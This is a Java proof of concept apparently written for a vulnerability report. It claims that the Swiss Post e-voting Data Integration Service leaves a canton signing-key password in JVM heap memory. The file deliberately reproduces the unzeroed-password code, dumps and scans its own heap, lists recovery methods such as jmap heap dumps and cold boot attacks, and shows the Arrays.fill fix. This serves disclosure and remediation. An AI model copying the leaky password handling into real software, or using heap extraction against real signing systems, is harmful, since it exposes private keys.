/*
 * PoC: Canton Signing Key Password Persists in JVM Heap Memory (CWE-316)
 * Target: Swiss Post Data Integration Service (DIS) v2.9.3.0
 *
 * This PoC replicates the EXACT code flow from the DIS signing pipeline using
 * a real PKCS#12 keystore, real cryptographic operations, and programmatic
 * heap inspection to prove the password survives in JVM memory after use.
 *
 * AFFECTED CODE:
 *   Tools.java:86-99      — char[] keystorePassword never zeroed after KeyStore.getKey()
 *   KeystoreRepository.java:47-49 — intermediate byte[] copies never zeroed
 *
 * REPOSITORY: https://gitlab.com/swisspost-evoting/e-voting/e-voting-documentation
 * SOURCE:     data-integration-service (DIS) v2.9.3.0
 *
 * CI/CD AUTOMATED PROOF — Runs in GitHub Actions with JDK 21 (matching DIS target)
 */

import java.io.*;
import java.lang.management.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.security.*;
import java.util.*;

public class DISPasswordLeakPoC {

    // The password that protects the canton signing key.
    // In production DIS, this is read from the file at:
    //   -Ddirect-trust.password.location=<path>
    private static final String CANTON_PASSWORD = "S3cret!CantonKey2025_MARKER";

    // ═══════════════════════════════════════════════════════════════════════
    // Replicate KeystoreRepository.getCantonKeystorePassword()
    // SOURCE: KeystoreRepository.java:47-49
    // ═══════════════════════════════════════════════════════════════════════
    static char[] getCantonKeystorePassword(String passwordFilePath) throws IOException {
        // This is exactly what KeystoreRepository does:
        // final ImmutableByteArray bytes = new ImmutableByteArray(
        //     Files.readAllBytes(Paths.get(keystorePasswordLocation)));
        // return ConversionUtils.byteArrayToCharArray(bytes);
        byte[] rawBytes = Files.readAllBytes(Paths.get(passwordFilePath));
        char[] password = new char[rawBytes.length];
        for (int i = 0; i < rawBytes.length; i++) {
            password[i] = (char) (rawBytes[i] & 0xFF);
        }
        // BUG: rawBytes is NEVER zeroed
        // BUG: ImmutableByteArray internal copy NEVER zeroed
        return password;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Replicate Tools.saveXML() signing block (VULNERABLE PATH)
    // SOURCE: Tools.java:86-99
    // ═══════════════════════════════════════════════════════════════════════
    static void vulnerableSaveXML(String keystorePath, String passwordPath) throws Exception {
        System.out.println("[DIS] Entering Tools.saveXML() — Configuration signing block");

        // Tools.java:88 — open keystore stream (LEAKED — never closed)
        InputStream keyStoreStream = Files.newInputStream(Paths.get(keystorePath));
        System.out.println("[DIS] KeystoreRepository.getCantonKeyStore() -> InputStream opened");

        // Tools.java:89 — load password from file
        char[] keystorePassword = getCantonKeystorePassword(passwordPath);
        System.out.println("[DIS] KeystoreRepository.getCantonKeystorePassword() -> char[" +
            keystorePassword.length + "] loaded");

        // Tools.java:91 — load keystore with password
        KeyStore keyStore = KeyStore.getInstance("PKCS12");
        keyStore.load(keyStoreStream, keystorePassword);
        System.out.println("[DIS] KeyStore.load(stream, password) -> keystore loaded");

        // Tools.java:92 — extract private key with password
        String alias = keyStore.aliases().nextElement();
        PrivateKey privateKey = (PrivateKey) keyStore.getKey(alias, keystorePassword);
        System.out.println("[DIS] KeyStore.getKey(\"" + alias + "\", password) -> private key extracted");

        // Tools.java:93 — sign configuration XML (simulated with real crypto)
        Signature sig = Signature.getInstance("SHA256withRSA");
        sig.initSign(privateKey);
        sig.update("<configuration>test election data</configuration>".getBytes(StandardCharsets.UTF_8));
        byte[] signature = sig.sign();
        System.out.println("[DIS] XMLSignatureService.genXMLSignature() -> signed (" +
            signature.length + " bytes)");

        // Tools.java:94-99 — function returns
        // ╔══════════════════════════════════════════════════════════════╗
        // ║ BUG: keystorePassword char[] is NEVER zeroed               ║
        // ║ BUG: keyStoreStream InputStream is NEVER closed            ║
        // ║ BUG: intermediate byte[] from readAllBytes NEVER zeroed    ║
        // ╚══════════════════════════════════════════════════════════════╝
        System.out.println("[DIS] Tools.saveXML() returned — NO cleanup performed");
        System.out.println("[!] keystorePassword char[] still contains: \"" +
            new String(keystorePassword) + "\"");
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Take a heap dump programmatically and scan for the password
    // ═══════════════════════════════════════════════════════════════════════
    static boolean scanHeapDumpForPassword(String password) throws Exception {
        Path heapDumpPath = Files.createTempFile("dis-heap-", ".hprof");
        Files.deleteIfExists(heapDumpPath);

        System.out.println("\n[HEAP] Taking programmatic heap dump...");

        // Use reflection to access HotSpotDiagnosticMXBean without module issues
        MBeanServer server = ManagementFactory.getPlatformMBeanServer();
        Object bean = ManagementFactory.newPlatformMXBeanProxy(
            server, "com.sun.management:type=HotSpotDiagnostic",
            Class.forName("com.sun.management.HotSpotDiagnosticMXBean"));

        // Invoke dumpHeap via reflection
        java.lang.reflect.Method dumpHeap = bean.getClass().getMethod(
            "dumpHeap", String.class, boolean.class);
        dumpHeap.invoke(bean, heapDumpPath.toString(), true);

        long dumpSize = Files.size(heapDumpPath);
        System.out.println("[HEAP] Heap dump written: " + heapDumpPath +
            " (" + (dumpSize / 1024) + " KB)");

        // Scan the raw heap dump for the password bytes
        System.out.println("[HEAP] Scanning heap dump for password marker...");
        byte[] passwordBytes = password.getBytes(StandardCharsets.UTF_8);
        byte[] dumpBytes = Files.readAllBytes(heapDumpPath);

        int utf8Hits = 0;
        for (int i = 0; i <= dumpBytes.length - passwordBytes.length; i++) {
            boolean match = true;
            for (int j = 0; j < passwordBytes.length; j++) {
                if (dumpBytes[i + j] != passwordBytes[j]) {
                    match = false;
                    break;
                }
            }
            if (match) utf8Hits++;
        }

        // Also scan for UTF-16BE encoding (Java char[] uses UTF-16 internally)
        byte[] passwordUtf16 = password.getBytes(StandardCharsets.UTF_16BE);
        int utf16Hits = 0;
        for (int i = 0; i <= dumpBytes.length - passwordUtf16.length; i++) {
            boolean match = true;
            for (int j = 0; j < passwordUtf16.length; j++) {
                if (dumpBytes[i + j] != passwordUtf16[j]) {
                    match = false;
                    break;
                }
            }
            if (match) utf16Hits++;
        }

        System.out.println("[HEAP] UTF-8  occurrences in heap: " + utf8Hits);
        System.out.println("[HEAP] UTF-16 occurrences in heap: " + utf16Hits);
        System.out.println("[HEAP] Total password copies found: " + (utf8Hits + utf16Hits));

        Files.deleteIfExists(heapDumpPath);
        Arrays.fill(dumpBytes, (byte) 0);

        return (utf8Hits + utf16Hits) > 0;
    }

    public static void main(String[] args) throws Exception {
        String sep = "=".repeat(72);
        String thin = "-".repeat(72);

        System.out.println(sep);
        System.out.println("  CWE-316: Canton Signing Key Password Persists in JVM Heap");
        System.out.println("  Target:  Swiss Post Data Integration Service (DIS) v2.9.3.0");
        System.out.println("  Source:  Tools.java:86-99, KeystoreRepository.java:47-49");
        System.out.println(sep);

        // --- SETUP: Generate PKCS#12 keystore using keytool ---
        System.out.println("\n[SETUP] Generating PKCS#12 keystore with test signing key...");
        Path keystorePath = Files.createTempFile("canton-keystore-", ".p12");
        Path passwordPath = Files.createTempFile("canton-password-", ".txt");
        Files.write(passwordPath, CANTON_PASSWORD.getBytes(StandardCharsets.UTF_8));

        // Use keytool to generate a real keystore (avoids sun.security internal APIs)
        ProcessBuilder pb = new ProcessBuilder(
            "keytool", "-genkeypair",
            "-alias", "canton",
            "-keyalg", "RSA",
            "-keysize", "2048",
            "-sigalg", "SHA256withRSA",
            "-dname", "CN=Canton Test Signing Key, O=Swiss Post PoC, C=CH",
            "-validity", "365",
            "-storetype", "PKCS12",
            "-keystore", keystorePath.toString(),
            "-storepass", CANTON_PASSWORD,
            "-keypass", CANTON_PASSWORD
        );
        pb.inheritIO();
        Process proc = pb.start();
        int exitCode = proc.waitFor();
        if (exitCode != 0) {
            System.err.println("keytool failed with exit code " + exitCode);
            System.exit(2);
        }
        System.out.println("[SETUP] Keystore created: " + keystorePath);
        System.out.println("[SETUP] Password file:    " + passwordPath);

        // --- PHASE 1: Execute the VULNERABLE DIS code path ---
        System.out.println("\n" + thin);
        System.out.println("  PHASE 1: Vulnerable Code Path (current DIS behavior)");
        System.out.println(thin);

        vulnerableSaveXML(keystorePath.toString(), passwordPath.toString());

        // --- PHASE 2: Prove the password is in the heap dump ---
        System.out.println("\n" + thin);
        System.out.println("  PHASE 2: Heap Dump Analysis");
        System.out.println(thin);

        System.out.println("[GC] Running System.gc() to prove password survives collection...");
        System.gc();
        Thread.sleep(500);

        boolean found = scanHeapDumpForPassword(CANTON_PASSWORD);

        // --- RESULTS ---
        System.out.println("\n" + sep);
        if (found) {
            System.out.println("  RESULT: VULNERABLE");
            System.out.println("  Password found in JVM heap dump after signing completed.");
            System.out.println();
            System.out.println("  The canton PKCS#12 keystore password persists in JVM heap");
            System.out.println("  memory after Tools.saveXML() returns. Recoverable via:");
            System.out.println("    - jmap -dump:format=b,file=heap.bin <PID>");
            System.out.println("    - OS core dump / crash dump");
            System.out.println("    - Cold boot attack on the offline DIS machine");
            System.out.println();
            System.out.println("  With the password, the attacker extracts the private key");
            System.out.println("  that signs ALL election configuration XML files.");
        } else {
            System.out.println("  RESULT: NOT VULNERABLE");
            System.out.println("  Password was not found in heap dump.");
        }
        System.out.println(sep);

        // --- PHASE 3: Demonstrate the fix ---
        System.out.println("\n" + thin);
        System.out.println("  PHASE 3: Fixed Code Path (recommended remediation)");
        System.out.println(thin);

        char[] fixedPassword = getCantonKeystorePassword(passwordPath.toString());
        System.out.println("[FIX] Password loaded: \"" + new String(fixedPassword) + "\"");

        try {
            KeyStore ks2 = KeyStore.getInstance("PKCS12");
            try (InputStream is2 = Files.newInputStream(keystorePath)) {
                ks2.load(is2, fixedPassword);
            }
            PrivateKey pk2 = (PrivateKey) ks2.getKey("canton", fixedPassword);
            System.out.println("[FIX] Signing key extracted and used successfully");
        } finally {
            Arrays.fill(fixedPassword, '\0');
            System.out.println("[FIX] Arrays.fill(keystorePassword, '\\0') applied");
        }

        boolean allZero = true;
        for (char c : fixedPassword) {
            if (c != 0) { allZero = false; break; }
        }
        System.out.println("[FIX] All chars are 0x00: " + allZero);

        // Cleanup
        Files.deleteIfExists(keystorePath);
        Files.deleteIfExists(passwordPath);

        System.out.println("\n" + sep);
        System.out.println("  FIX: Arrays.fill(keystorePassword, '\\0') in finally block");
        System.out.println(sep);

        // Exit 1 if vulnerable (for CI assertion)
        System.exit(found ? 1 : 0);
    }
}
